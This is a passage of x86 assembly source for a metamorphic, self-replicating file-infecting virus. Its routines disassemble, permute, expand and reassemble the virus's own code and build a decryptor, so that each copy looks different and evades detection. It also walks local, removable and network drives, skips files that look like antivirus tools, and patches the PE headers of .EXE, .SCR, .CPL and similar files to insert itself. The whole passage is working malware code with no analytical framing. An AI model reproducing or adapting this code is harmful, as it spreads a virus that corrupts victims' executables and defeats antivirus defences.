                call    Random
                and     eax, 7FFFh 
                add     edx, eax

                mov     eax, [esi]
                or      eax, eax               
                jz    @@GarbleSect_CodeSection 
                cmp     eax, 1                   
                jz    @@GarbleSect_DisasmSection 
                cmp     eax, 2
                jz    @@GarbleSect_BuffersSection 
                cmp     eax, 3
                jz    @@GarbleSect_DataSection   
                cmp     eax, 4
                jnz   @@GarbleSect_Next          
      @@GarbleSect_Disasm2Section:
                mov     [ebp+New_DISASM2_SECTION], edx
                add     edx, 100000h      
                jmp   @@GarbleSect_Next
      @@GarbleSect_CodeSection:
                mov     [ebp+New_CODE_SECTION], edx
                add     edx, 80000h       
                jmp   @@GarbleSect_Next
      @@GarbleSect_DisasmSection:
                mov     [ebp+New_DISASM_SECTION], edx
                add     edx, 100000h      
                jmp   @@GarbleSect_Next
      @@GarbleSect_BuffersSection:
                mov     [ebp+New_BUFFERS_SECTION], edx
                add     edx, 60000h       
                jmp   @@GarbleSect_Next
      @@GarbleSect_DataSection:
                mov     [ebp+New_DATA_SECTION], edx
                add     edx, 20000h       
      @@GarbleSect_Next:
                add     esi, 4
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopGarbleSect_03


                mov     eax, [ebp+_DISASM_SECTION]
                add     eax, ebp                    
                mov     [ebp+InstructionTable], eax 
                mov     eax, [ebp+_LABEL_SECTION]
                add     eax, ebp                    
                mov     [ebp+LabelTable], eax       
                mov     eax, [ebp+_BUFFER1_SECTION]
                add     eax, ebp                    
                mov     [ebp+FutureLabelTable], eax 
                mov     eax, [ebp+_DISASM2_SECTION]
                add     eax, ebp                    
                mov     [ebp+PathMarksTable], eax   

                mov     esi, [ebp+_CODE_SECTION]
                add     esi, ebp                
                call    DisasmCode              
                nop     
                        
                        
                mov     [ebp+AddressOfLastInstruction], edi 

                call    ShrinkCode  

                mov     eax, [ebp+_VARIABLE_SECTION]
                add     eax, ebp                  
                mov     [ebp+VariableTable], eax  
                mov     eax, [ebp+_VAR_MARKS_SECTION]
                add     eax, ebp                  
                mov     [ebp+VarMarksTable], eax  
                                                  
                mov     ecx, [ebp+DeltaRegister] 
                                                 
                                                 
                call    IdentifyVariables  
                                           

                mov     eax, [ebp+_BUFFER1_SECTION]
                add     eax, ebp               
                mov     [ebp+FramesTable], eax 
                mov     eax, [ebp+_DISASM2_SECTION]
                add     eax, ebp                     
                mov     [ebp+PermutationResult], eax 
                mov     eax, [ebp+_BUFFER2_SECTION]
                add     eax, ebp               
                mov     [ebp+JumpsTable], eax  
                call    PermutateCode
                                  

                mov     eax, [ebp+PermutationResult]
                mov     [ebp+InstructionTable], eax 

                xor     eax, eax                   
                mov     [ebp+CreatingADecryptor], eax 
                                                      
                mov     eax, [ebp+_DISASM_SECTION]
                add     eax, ebp              
                mov     [ebp+ExpansionResult], eax  
                xor     eax, eax                     
                mov     [ebp+SizeOfExpansion], eax   
                call    XpandCode             

                mov     eax, [ebp+ExpansionResult]
                mov     [ebp+InstructionTable], eax  
                mov     eax, [ebp+_DISASM2_SECTION]
                add     eax, ebp                     
                mov     [ebp+NewAssembledCode], eax  
                                                     
                mov     eax, [ebp+_VARIABLE_SECTION]
                add     eax, ebp                     
                mov     [ebp+NewLabelTable], eax     
                mov     eax, [ebp+_BUFFER1_SECTION]
                add     eax, ebp                       
                mov     [ebp+JumpRelocationTable], eax 
                call    AssembleCode         


                mov     eax, [ebp+_DISASM_SECTION]
                add     eax, ebp                       
                mov     [ebp+DecryptorPseudoCode], eax 
                add     eax, 80000h
                mov     [ebp+AssembledDecryptor], eax  

                mov     eax, [ebp+_BUFFER2_SECTION]
                add     eax, ebp                  
                mov     [ebp+FindFileData], eax   
                mov     eax, [ebp+_BUFFER1_SECTION]
                add     eax, ebp                  
                mov     [ebp+OtherBuffers], eax   
                call    InfectFiles    
      @@Error:
                ret             
Main            endp

;----------------------------------------------------------------------------------------
IdentifyVariables proc
                mov     esi, [ebp+InstructionTable]
                mov     edi, [ebp+VariableTable]
                xor     eax, eax
                mov     [ebp+NumberOfVariables], eax 

        @@LoopGetVar:
                xor     eax, eax     
                mov     al, [esi]    
                cmp     eax, 0FCh    
                jz    @@NextInstruction
                call    CheckIfInstructionUsesMem 
                                                  
                or      eax, eax              
                jz    @@NextInstruction       
                mov     al, [esi+1]           
                cmp     eax, ecx              
                jz    @@DeltaOffsetAt1        
                mov     al, [esi+2]           
                cmp     eax, ecx              
                jz    @@DeltaOffsetAt2        
        @@NextInstruction:
                add     esi, 10h              
                cmp     esi, [ebp+AddressOfLastInstruction] 
                jnz   @@LoopGetVar                          
                jmp   @@SelectNewVariables   
        @@DeltaOffsetAt1:
                mov     al, [esi+2]          
                jmp   @@Continue_01          
        @@DeltaOffsetAt2:
                mov     al, [esi+1]
        @@Continue_01:
                cmp     eax, 8               
                jnz   @@NextInstruction      
                mov     eax, [esi+3]         
                mov     edx, [ebp+VariableTable]     
                mov     ebx, [ebp+NumberOfVariables] 
                                                     
                sub     eax, [ebp+_DATA_SECTION] 
                and     eax, 0FFFFFFF8h          
        @@LookForVariable:
                or      ebx, ebx           
                jz    @@InsertVariable     
                cmp     eax, [edx]         
                jz    @@VariableExists     
                add     edx, 4             
                sub     ebx, 4
                jmp   @@LookForVariable
       @@InsertVariable:                   
                mov     [edx], eax         
                mov     eax, [ebp+NumberOfVariables]  
                add     eax, 4
                mov     [ebp+NumberOfVariables], eax
       @@VariableExists:
                mov     eax, 00000809h  
                mov     [esi+1], eax    
                mov     [esi+3], edx    
                jmp   @@NextInstruction

       @@SelectNewVariables:
                mov     ecx, 20000h / 4    
                mov     edi, [ebp+VarMarksTable] 
                xor     eax, eax                 
       @@LoopInitializeMarks:
                mov     [edi], eax      
                add     edi, 4          
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopInitializeMarks



                mov     ecx, [ebp+NumberOfVariables] 
                mov     ebx, [ebp+VariableTable]     
           @@LoopGetNewVar:
                call    Random           
                and     eax, 01FFF8h
                add     eax, [ebp+VarMarksTable] 

                mov     edx, [eax]       
                or      edx, edx
                jnz   @@LoopGetNewVar    

                mov     edx, 1           
                mov     [eax], edx       
                sub     eax, [ebp+VarMarksTable]
                push    ebx              
                mov     ebx, eax
                call    Random           
                and     eax, 3
                add     eax, ebx
                pop     ebx
                mov     [ebx], eax    
                add     ebx, 4
                sub     ecx, 4        
                or      ecx, ecx      
                jnz   @@LoopGetNewVar 

                ret                   
IdentifyVariables endp

;----------------------------------------------------------------------------------------
PermutateCode   proc
                xor     eax, eax
                mov     [ebp+NumberOfJumps], eax  
                mov     edi, [ebp+FramesTable]
                mov     ecx, [ebp+AddressOfLastInstruction]
                mov     eax, [ebp+InstructionTable]
                mov     esi, eax
                sub     ecx, eax 

       @@NextFrame:
                call    Random     
                and     eax, 0F0h  
                cmp     eax, 050h
                jb    @@NextFrame
                add     eax, 0F0h  
                mov     [edi], esi 
                add     esi, eax
                mov     [edi+4], esi 
                mov     ebx, esi
    @@LoopCheckInst00:
                sub     ebx, 10h    
                cmp     ebx, [edi]  
                jz    @@CheckInst_Next00
                mov     edx, [ebx]  
                and     edx, 0FFh
                cmp     edx, 0FFh         
                jz    @@LoopCheckInst00   
                cmp     edx, 0EAh         
                jnz   @@CheckInst_Next00  
    @@LoopCheckInst01:
                add     ebx, 10h          
                cmp     ebx, [ebp+AddressOfLastInstruction] 
                jz    @@CheckInst_Next00                 
                mov     edx, [ebx]        
                and     edx, 0FFh
                cmp     edx, 0FFh         
                jz    @@LoopCheckInst01   
                cmp     edx, 0F6h         
                jnz   @@CheckInst_Next00  
                add     ebx, 10h          
                sub     ebx, esi
                add     eax, ebx
                add     esi, ebx
                mov     [edi+4], esi
    @@CheckInst_Next00:
                mov     ebx, esi          
                jmp   @@DontAdd10hYet     
    @@LoopCheckInst02:
                add     ebx, 10h          
    @@DontAdd10hYet:
                cmp     ebx, [ebp+AddressOfLastInstruction]  
                jz    @@CheckInst_Next01           
                mov     edx, [ebx]
                and     edx, 0FFh
                cmp     edx, 0FFh         
                jz    @@LoopCheckInst02   
                cmp     edx, 0E9h         
                jz    @@CheckInst_IncludeInstruction
                cmp     edx, 0FEh         
                jz    @@CheckInst_IncludeInstruction
                cmp     edx, 0EBh         
                jz    @@CheckInst_IncludeInstruction
                cmp     edx, 0EDh         
                jz    @@CheckInst_IncludeInstruction
                cmp     edx, 70h          
                jb    @@CheckInst_Next01
                cmp     edx, 7Fh
                ja    @@CheckInst_Next01

  
      @@CheckInst_IncludeInstruction:
                add     ebx, 10h  
                push    ebx       
                sub     ebx, esi  
                add     eax, ebx  
                add     esi, ebx
                mov     [edi+4], esi
                pop     ebx
                jmp   @@DontAdd10hYet
    @@CheckInst_Next01:
                add     edi, 8     
                sub     ecx, eax
                cmp     ecx, 01E0h 
                jae   @@NextFrame  
                or      ecx, ecx   
                jz    @@FramesCreationFinished  
                mov     [edi], esi           
                add     esi, ecx             
                mov     [edi+4], esi
                add     edi, 8
    @@FramesCreationFinished:
                mov     [ebp+AddressOfLastFrame], edi 
    @@TempLabel:

                mov     eax, edi               
                mov     ebx, [ebp+FramesTable] 
                sub     eax, ebx               
                
                mov     ebx, 8
        @@LoopCalculateMOD:
                shl     ebx, 1
                cmp     ebx, eax
                jb    @@LoopCalculateMOD
                sub     ebx, 8
                mov     [ebp+MODValue], ebx

     
     
                mov     esi, [ebp+FramesTable]
                mov     [ebp+PositionOfFirstInstruction], esi
                        
                 mov     edx, esi
      @@LoopExchange:
                call    Random
                mov     ebx, [ebp+MODValue]
                and     eax, ebx
                add     eax, esi     

; ; Uncommenting this instruction the engine doesn't permutate anything
;                mov     eax, edx

                cmp     eax, edi     
                jae   @@LoopExchange 
                mov     ecx, [eax]   
                mov     ebx, [edx]   
                mov     [eax], ebx
                mov     [edx], ecx   
                cmp     edx, [ebp+PositionOfFirstInstruction]
                jnz   @@LookEAX
                mov     [ebp+PositionOfFirstInstruction], eax
                jmp   @@ExchangeNext
         @@LookEAX:
                cmp     eax, [ebp+PositionOfFirstInstruction]
                jnz   @@ExchangeNext
                mov     [ebp+PositionOfFirstInstruction], edx
         @@ExchangeNext:
                add     eax, 4
                add     edx, 4
                mov     ecx, [eax]   
                mov     ebx, [edx]
                mov     [eax], ebx
                mov     [edx], ecx
                add     edx, 4       
                cmp     edx, edi     
                jb    @@LoopExchange 
                                

                mov     esi, [ebp+InstructionTable]
                mov     edi, [ebp+PermutationResult]
                mov     ebx, [ebp+FramesTable]

                mov     eax, [ebp+PositionOfFirstInstruction]
                cmp     ebx, eax
                jnz   @@InsertJump2
      @@LoopCopyFrame:
                mov     eax, 0FFh
                mov     [ebp+Permut_LastInstruction], eax
                mov     edx, [ebx]      
                add     ebx, 4          
                mov     ecx, [ebx]
                add     ebx, 4
      @@LoopCopyInstructions:
                mov     eax, [edx]
                cmp     al, 4Fh         
                jnz   @@NextInstruction 
                mov     al, 51h         
                mov     [edx], eax      
                push    eax
                push    ebx
                mov     ebx, [edx+7]
                mov     eax, 59h
                mov     [ebx], al
                pop     ebx
                pop     eax
         @@NextInstruction:
                mov     [edi], eax      
                mov     eax, [edx+4]
                mov     [edi+4], eax
                mov     eax, [edx+8]
                mov     [edi+8], eax
                mov     [edi+0Ch], edx  
                mov     [edx+0Ch], edi  
                mov     eax, [edi]
                and     eax, 0FFh       
                cmp     eax, 0FFh
                jz    @@NextInstruction2
        @@SetLastInstruction:                          
                mov     [ebp+Permut_LastInstruction], eax
                jmp   @@NextInstruction3
        @@NextInstruction2:
                mov     eax, [edi+0Bh]   
                and     eax, 0FFh
                or      eax, eax         
                jnz   @@SetLastInstruction
        @@NextInstruction3:
                add     edi, 10h         
                add     edx, 10h
                cmp     edx, ecx         
                jnz   @@LoopCopyInstructions  
                mov     eax, [ebp+AddressOfLastFrame] 
                cmp     ebx, eax                  
                jae   @@LastFrameArrived          
                mov     eax, [ebx]           
                cmp     eax, edx             
                jz    @@LoopTestIfLastFrame  
                                             
       @@LastFrameArrived:
                mov     eax, [ebp+Permut_LastInstruction]
                cmp     eax, 0E9h  
                jz    @@LoopTestIfLastFrame
                cmp     eax, 0EBh  
                jz    @@LoopTestIfLastFrame
                cmp     eax, 0EDh  
                jz    @@LoopTestIfLastFrame
                cmp     eax, 0FEh  
                jz    @@LoopTestIfLastFrame
                mov     [edi+1], edx  
      @@InsertJump:
                mov     eax, 0E9h     
                mov     [edi], al     
                
                call    InsertJumpInTable 
                add     edi, 10h      
      @@LoopTestIfLastFrame:
                mov     eax, [ebp+AddressOfLastFrame] 
                cmp     ebx, eax                   
                jae   @@End               
                jmp   @@LoopCopyFrame     
      @@InsertJump2:
                mov     eax, [eax]        
                mov     [edi+1], eax      
                jmp   @@InsertJump        
                  
      @@End:    mov     [ebp+AddressOfLastInstruction], edi
                                        
                mov     ecx, [ebp+NumberOfLabels]
                mov     edx, [ebp+LabelTable]
        @@LoopUpdateLabel:
                mov     eax, [edx+4]    
                mov     ebx, [eax+0Ch]  
                                        
                mov     [edx], ebx      
                add     edx, 8
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopUpdateLabel 
                
                mov     ecx, [ebp+NumberOfJumps]
                mov     ebx, [ebp+JumpsTable]
                jmp   @@CheckNumberOfJumps
        @@LoopUpdateJumps:
                mov     esi, [ebx]     
                mov     eax, [esi+1]   
                mov     edi, [eax+0Ch] 
                mov     [edx], edi     
                mov     [edx+4], eax   
                mov     [esi+1], edx   
                mov     eax, [ebp+NumberOfLabels]
                add     eax, 1
                mov     [ebp+NumberOfLabels], eax
                add     edx, 8      
                add     ebx, 4      
                sub     ecx, 4
        @@CheckNumberOfJumps:
                or      ecx, ecx
                jnz   @@LoopUpdateJumps         
                ret
PermutateCode   endp

Random          proc
                push    edx
                push    ecx
                mov     eax, [ebp+RndSeed1]
                mov     ecx, [ebp+RndSeed2]
                add     eax, ecx
                call    RandomMod1
                xor     eax, [ebp+RndSeed1]
                mov     [ebp+RndSeed1], eax

                mov     ecx, eax
                mov     eax, [ebp+RndSeed2]
                add     [ebp+RndSeed2], ecx
                call    RandomMod2
                xor     eax, [ebp+RndSeed2]
                mov     [ebp+RndSeed2], eax
                xor     eax, [ebp+RndSeed1]
                call    RandomMod2
                pop     ecx
                pop     edx
                ret
Random          endp

RandomMod1      proc
                mov     edx, eax
                and     edx, 1FFFh
                shl     edx, 13h
                and     eax, 0FFFFFE00h
                shr     eax, 0Dh
                or      eax, edx
                add     eax, ecx
                ret
RandomMod1      endp

RandomMod2      proc
                mov     edx, eax
                and     edx, 1FFFFh
                shl     edx, 0Fh
                and     eax, 0FFFFE000h
                shr     eax, 11h
                or      eax, edx
                add     eax, ecx
                ret
RandomMod2      endp

InsertJumpInTable proc
                mov     ecx, [ebp+NumberOfJumps]
                mov     edx, [ebp+JumpsTable]
                add     edx, ecx
                mov     [edx], edi
                add     ecx, 4
                mov     [ebp+NumberOfJumps], ecx
                ret
InsertJumpInTable endp

;----------------------------------------------------------------------------------------

InfectFiles     proc
                call    Random
                and     eax, 3
                jnz   @@DontLoop
        @@LoopAgain:
                call    Random
                and     eax, 0FFh
                jnz   @@LoopAgain
        @@DontLoop:
                xor     eax, eax      
                mov     [ebp+DirectoryDeepness], eax

                call    InfectFiles2  

                mov     ebx, [ebp+FindFileData]
                add     ebx, 1000h
    @@LoopGetDrives:
                xor     eax, eax      
                mov     [ebp+DirectoryDeepness], eax

                push    eax         
                push    ecx
                push    edx
                mov     eax, [ebp+FindFileData]
                add     eax, 1000h
                push    eax
                mov     eax, 200h
                push    eax
                call    dword ptr [ebp+RVA_GetLogicalDriveStringsA]
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax

                mov     eax, [ebp+ReturnValue]
                or      eax, eax       
                jz    @@Error2

                push    eax
                push    ecx
                push    edx

                mov     eax, ebx       
                push    eax            
                call    dword ptr [ebp+RVA_GetDriveTypeA] 
                mov     [ebp+ReturnValue], eax

                pop     edx
                pop     ecx
                pop     eax

                mov     eax, [ebp+ReturnValue]
                cmp     eax, 3    
                jz    @@InfectDrive
                cmp     eax, 4    
                jnz   @@NextDrive
                cmp     eax, 6    
                   
       @@InfectDrive:
                push    eax
                push    ecx
                push    edx  

                mov     eax, ebx
                push    eax   
                call    dword ptr [ebp+RVA_SetCurrentDirectoryA]
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx            
                pop     eax            

                mov     eax, [ebp+ReturnValue]
                or      eax, eax
                jz    @@Error2         

                push    ebx
                call    InfectFiles2   
                pop     ebx

      @@NextDrive:

      @@LoopFindNull:
                add     ebx, 1         
                mov     eax, [ebx]     
                and     eax, 0FFh      
                or      eax, eax
                jnz   @@LoopFindNull
                add     ebx, 1
                mov     eax, [ebx]
                and     eax, 0FFh
                or      eax, eax
                jnz   @@LoopGetDrives  
     @@Error2:
                ret
InfectFiles     endp

InfectFiles2    proc
                push    eax
                push    ecx
                push    edx  

                mov     eax, [ebp+FindFileData]
                push    eax
                mov     edx, [ebp+OtherBuffers]
                push    edx

                mov     eax, '*.*'     
                mov     [edx], eax

                call    dword ptr [ebp+RVA_FindFirstFileA]
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax  

                mov     eax, [ebp+ReturnValue]
                cmp     eax, -1
                jz    @@Error
                mov     [ebp+hFindFile], eax
     @@TouchAgain:
                mov     edx, [ebp+FindFileData] 
                mov     eax, [edx]
                and     eax, 10h          
                or      eax, eax
                jz    @@TryToInfectFile   


                mov     eax, [ebp+DirectoryDeepness]
                cmp     eax, 5            
                jz    @@InfectNextFile    
                mov     eax, [edx+2Ch]
                and     eax, 0FFFFFFh     
                cmp     eax, '..'
                jz    @@InfectNextFile    
                and     eax, 0FFFFh
                cmp     eax, '.'          
                jz    @@InfectNextFile    
                and     eax, 01Fh
                cmp     eax, 'W' AND 1Fh  
                jz    @@InfectNextFile    
                                      
                                      
                                      
                push    eax
                push    ecx
                push    edx    

                mov     eax, edx
                add     eax, 2Ch      
                push    eax
                call    dword ptr [ebp+RVA_SetCurrentDirectoryA]
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax

                mov     eax, [ebp+ReturnValue]
                or      eax, eax           
                jz    @@InfectNextFile

                mov     eax, [ebp+DirectoryDeepness]
                add     eax, 1             
                mov     [ebp+DirectoryDeepness], eax

                mov     eax, [ebp+hFindFile]  
                push    eax
                call    InfectFiles2          
                pop     eax
                mov     [ebp+hFindFile], eax  

                mov     eax, [ebp+DirectoryDeepness]
                sub     eax, 1             
                mov     [ebp+DirectoryDeepness], eax

                mov     edx, [ebp+FindFileData]
                mov     eax, '..'          
                mov     [edx], eax         
                                      
                push    eax           
                push    ecx
                push    edx

                mov     eax, edx
                push    eax           
                call    dword ptr [ebp+RVA_SetCurrentDirectoryA]
                mov     [ebp+ReturnValue], eax

                pop     edx
                pop     ecx
                pop     eax

                mov     eax, [ebp+ReturnValue]
                or      eax, eax
                jz    @@Error2         
                jmp   @@InfectNextFile 

    
     @@TryToInfectFile:
                xor     eax, eax
                mov     eax, 3
                call    Random
                and     eax, 1
                jnz   @@InfectNextFile 
                           
                mov     edx, [ebp+FindFileData]
                add     edx, 2Ch       


                 mov     eax, [edx]
                 and     eax, 1F1F1F1Fh
                 cmp     eax, 'itna' AND 1F1F1F1Fh
                 jz    @@InfectNextFile  

                mov     eax, [edx]       
                and     eax, 1F1Fh
                cmp     eax, '-F' AND 1F1Fh  
                jz    @@InfectNextFile       
                cmp     eax, 'AP' AND 1F1Fh  
                jz    @@InfectNextFile
                cmp     eax, 'CS' AND 1F1Fh  
                jz    @@InfectNextFile
                cmp     eax, 'RD' AND 1F1Fh  
                jz    @@InfectNextFile
                cmp     eax, 'ON' AND 1F1Fh  
                jz    @@InfectNextFile
                cmp     eax, 'EI' AND 1F1Fh  
                jz    @@InfectNextFile
                cmp     eax, 'XE' AND 1F1Fh  
                jz    @@InfectNextFile
                cmp     eax, 'OW' AND 1F1Fh  
                jz    @@InfectNextFile

                mov     ebx, edx
     @@LoopFindExtension:
                mov     eax, [ebx]    
                and     eax, 01Fh     
                cmp     eax, 'V' AND 1Fh 
                jz    @@InfectNextFile
                cmp     eax, '0' AND 1Fh 
                or      eax, eax
                jz    @@CheckExtension
                add     ebx, 1
                jmp   @@LoopFindExtension
     @@CheckExtension:
                mov     eax, [ebx-4]     
                and     eax, 1F1F1FFFh
                cmp     eax, 'EXE.' AND 1F1F1FFFh
                jz    @@InfectFile
                cmp     eax, 'RCS.' AND 1F1F1FFFh
                jz    @@InfectFile
                cmp     eax, 'TAD.' AND 1F1F1FFFh
                jz    @@InfectFile
                cmp     eax, 'LVO.' AND 1F1F1FFFh
                jz    @@InfectFile
                cmp     eax, 'LPC.' AND 1F1F1FFFh
                jnz   @@InfectNextFile   

      @@InfectFile:
                call    TouchFile   
      @@InfectNextFile:             
                push    eax
                push    ecx
                push    edx  
                mov     eax, [ebp+FindFileData]
                push    eax
                mov     eax, [ebp+hFindFile]
                push    eax
                call    dword ptr [ebp+RVA_FindNextFileA]
                mov     [ebp+ReturnValue], eax    
                pop     edx                       
                pop     ecx
                pop     eax  

                mov     eax, [ebp+ReturnValue]  
                or      eax, eax
                jnz   @@TouchAgain
      @@Error2:
                push    eax
                push    ecx
                push    edx  
                mov     eax, [ebp+hFindFile]    
                push    eax
                call    dword ptr [ebp+RVA_FindClose]
                pop     edx
                pop     ecx
                pop     eax  
      @@Error:
                ret
InfectFiles2    endp

PrepareFile     proc
                mov     eax, [ebp+MappingAddress]
                mov     ebx, [eax]
                and     ebx, 0FFFFh
                cmp     ebx, 0+'ZM'       
                jnz   @@Error             
                mov     ebx, [eax+18h]    
                and     ebx, 0FFh         
                cmp     ebx, 40h
                jnz   @@Error
                mov     ebx, [eax+3Ch]
                add     ebx, eax
                mov     ecx, [ebx]
                cmp     ecx, 0+'EP'
                jnz   @@Error

                mov     [ebp+HeaderAddress], ebx

                mov     ecx, [ebx+58h]    
                or      ecx, ecx          
                jnz   @@Error             

                mov     ecx, [ebx+4]      
                and     ecx, 0FFFFh
                cmp     ecx, 014Ch        
                jz    @@IA32              

  
       @@IA32:  mov     ecx, [ebx+6]   
                and     ecx, 0FFFFh    
                
                mov     edx, [ebx+14h] 
                and     edx, 0FFFFh    
                add     edx, 18h
                add     edx, ebx
                mov     [ebp+StartOfSectionHeaders], edx
                xor     eax, eax                
                mov     [ebp+RelocHeader], eax  
                mov     [ebp+TextHeader], eax
                mov     [ebp+DataHeader], eax

        @@LoopSections:
                mov     eax, [edx]       
                mov     esi, [edx+4]     
                cmp     eax, 'ler.'      
                jnz   @@LookForCode
                cmp     esi, 0+'co'
                jnz   @@NextSection
                mov     [ebp+RelocHeader], edx  
                jmp   @@NextSection
        @@LookForCode:
                cmp     eax, 'xet.'      
                jnz   @@LookForCode2
                cmp     esi, 0+'t'
                jnz   @@NextSection
                mov     [ebp+TextHeader], edx 
                jmp   @@NextSection           
        @@LookForCode2:
                cmp     eax, 'EDOC'      
                jnz   @@LookForData
                or      esi, esi
                jnz   @@NextSection
                mov     [ebp+TextHeader], edx 
                jmp   @@NextSection           
        @@LookForData:
                cmp     eax, 'tad.'      
                jnz   @@LookForData2
                cmp     esi, 0+'a'
                jnz   @@NextSection
                mov     [ebp+DataHeader], edx 
                jmp   @@NextSection           
        @@LookForData2:
                cmp     eax, 'ATAD'      
                jnz   @@LookForData3
                or      esi, esi
                jnz   @@NextSection
                mov     [ebp+DataHeader], edx 
                jmp   @@NextSection           
        @@LookForData3:

        @@NextSection:
                mov     [ebp+LastHeader], edx 
                add     edx, 28h            
                dec     ecx                 
                or      ecx, ecx            
                jnz   @@LoopSections

                xor     eax, eax              
                mov     [ebp+ExitProcessAddress], eax    
                mov     [ebp+VirtualAllocAddress], eax   
                mov     [ebp+GetProcAddressAddress], eax
                mov     [ebp+GetModuleHandleAddress], eax

                mov     eax, [ebp+TextHeader]   
                or      eax, eax                
                jz    @@Error                   
                mov     eax, [ebp+DataHeader]
                or      eax, eax
                jz    @@Error
                mov     eax, [ebp+RelocHeader]  
                or      eax, eax                
                jz    @@NoRelocs    

                mov     eax, 3
                call    Random
                and     eax, 3      
                jz    @@NoRelocs2   
                                    
                                                  

                mov     eax, [ebp+RelocHeader]
                cmp     eax, [ebp+LastHeader]
                jnz   @@Error   

                
                mov     eax, 1           
                mov     [ebp+MakingFirstHole], eax  
                mov     esi, [ebp+TextHeader]
                mov     ecx, 2000h       
                call    UpdateHeaders    
                
                
                
                
                mov     [ebp+RVA_TextHole], edi
                mov     [ebp+Phys_TextHole], eax
                mov     [ebp+TextHoleSize], ecx

                mov     eax, [ebp+ExitProcessAddress]
                or      eax, eax      
                jz    @@Error         
             
             
             
                mov     eax, [ebp+GetProcAddressAddress]
                or      eax, eax     
                jz    @@Error        
                mov     eax, [ebp+GetModuleHandleAddress]
                or      eax, eax  
                jz    @@Error     

                mov     ebx, [ebp+HeaderAddress]
                add     [ebx+1Ch], ecx       
                                             
                                             
                add     [ebp+FileSize], ecx  

                xor     eax, eax                  
                mov     [ebp+MakingFirstHole], eax  
                mov     esi, [ebp+DataHeader]
                mov     ecx, [ebp+RoundedSizeOfNewCode]
                call    UpdateHeaders             
                mov     [ebp+RVA_DataHole], edi   
                mov     [ebp+Phys_DataHole], eax  

                mov     ebx, [ebp+HeaderAddress]  
                                                  
                mov     eax, [ebp+ExitProcessAddress] 
                add     eax, [ebx+34h]                
                mov     [ebp+ExitProcessAddress], eax 
                                                   
                mov     eax, [ebp+GetProcAddressAddress] 
                add     eax, [ebx+34h]                
                mov     [ebp+GetProcAddressAddress], eax 
                                                        
                mov     eax, [ebp+GetModuleHandleAddress]
                add     eax, [ebx+34h]
                mov     [ebp+GetModuleHandleAddress], eax

                mov     eax, [ebp+VirtualAllocAddress]
                or      eax, eax               
                jz    @@DontAddBaseAddress     
                add     eax, [ebp+34h]
                mov     [ebp+VirtualAllocAddress], eax
     @@DontAddBaseAddress:
                add     [ebx+20h], ecx         
                add     [ebp+FileSize], ecx    
                                               
                mov     esi, [ebp+RelocHeader]
                mov     eax, [esi+0Ch]
                mov     [ebx+50h], eax         
                                               
                mov     edi, [esi+14h]
                mov     ecx, [ebp+FileSize]   
                sub     ecx, edi              
                mov     [ebp+FileSize], edi   
                                              
                                              
                                              
                add     edi, [ebp+MappingAddress]
                xor     eax, eax              
     @@Loop0:   call    Random                
                and     eax, 0FCh
                mov     [edi], eax            
                add     edi, 4
                sub     ecx, 4
                or      ecx, ecx
                jnz   @@Loop0
                xor     eax, eax       
                mov     ecx, 28h       
     @@Loop1:   mov     [esi], eax     
                add     esi, 4
                sub     ecx, 4
                or      ecx, ecx
                jnz   @@Loop1

                mov     [ebx+0A0h], eax  
                mov     [ebx+0A4h], eax  

                mov     eax, [ebx+06h]   
                sub     eax, 1
                mov     [ebx+06h], eax
                mov     eax, [ebx+16h]   
                or      eax, 1           
                mov     [ebx+16h], eax

                mov     eax, 2000h    
                mov     [ebp+MaxSizeOfDecryptor], eax 
                                                      
                xor     eax, eax      
                ret
         @@Error:
                mov     eax, 1        
                ret

     @@NoRelocs2:
                xor     eax, eax        
                mov     [ebp+RelocHeader], eax 

     @@NoRelocs:
                xor     ecx, ecx        
                mov     edx, -1         
                call    UpdateImports

                mov     ecx, [ebp+HeaderAddress]      
                mov     eax, [ebp+ExitProcessAddress] 
                or      eax, eax                      
                jz    @@Error                         
                add     eax, [ecx+34h]                
                mov     [ebp+ExitProcessAddress], eax 
                                                      
                mov     eax, [ebp+GetProcAddressAddress]
                or      eax, eax
                jz    @@Error
                add     eax, [ecx+34h]
                mov     [ebp+GetProcAddressAddress], eax

                mov     eax, [ebp+GetModuleHandleAddress]
                or      eax, eax
                jz    @@Error
                add     eax, [ecx+34h]
                mov     [ebp+GetModuleHandleAddress], eax

                mov     eax, [ebp+VirtualAllocAddress] 
                or      eax, eax                       
                jz    @@NoVirtualAlloc                 
                add     eax, [ecx+34h]                 
                mov     [ebp+VirtualAllocAddress], eax 

     @@NoVirtualAlloc:                          
                xor     eax, eax
                call    Random      
                and     eax, 07h    
                                    
                jz    @@HoleAtLastSection

                mov     ebx, [ebp+TextHeader]
                mov     eax, [ebx+10h]    
                cmp     eax, [ebx+08h]    
                jae   @@CheckPaddingSpace 
                add     eax, [ebx+14h]    
                                          
                mov     [ebp+Phys_TextHole], eax 
                mov     eax, [ebx+10h]           
                add     eax, [ebx+0Ch]           
                mov     [ebp+RVA_TextHole], eax  
                                                 
                mov     eax, [ebx+08h]      
                sub     eax, [ebx+10h]      
                cmp     eax, 600h          
                jb    @@HoleAtLastSection  
                cmp     eax, 80000000h     
                ja    @@Error              
                cmp     eax, 2000h         
                jbe   @@TextHoleSizeOK     
                mov     eax, 2000h
      @@TextHoleSizeOK:
                mov     [ebp+MaxSizeOfDecryptor], eax 
                mov     edx, ebx
                mov     ecx, [ebp+LastHeader]   
      @@LoopAddPhysicalSize:
                cmp     edx, ebx               
                jz    @@NextAddPhysicalSize    
                add     [edx+14h], eax         
      @@NextAddPhysicalSize:                   
                cmp     edx, ecx
                jz    @@EndAddPhysicalSize
                add     edx, 28h
                jmp   @@LoopAddPhysicalSize

      @@EndAddPhysicalSize:                  
                mov     edx, [ebp+MappingAddress]
                mov     edi, edx
                add     edx, [ebx+14h]
                add     edx, [ebx+10h]
                add     edi, [ebp+FileSize]
                mov     esi, edi
                add     edi, eax
                add     [ebx+10h], eax
                mov     eax, 2000h
                add     [ebp+FileSize], eax
      @@LoopMakePhysicalHole:        
                call    Random       
                and     eax, 0FCh
                sub     edi, 4
                sub     esi, 4
                mov     eax, [esi]
                mov     [edi], eax
                cmp     edi, edx
                jnz   @@LoopMakePhysicalHole
                jmp   @@TextHoleMade


      @@HoleAtLastSection:
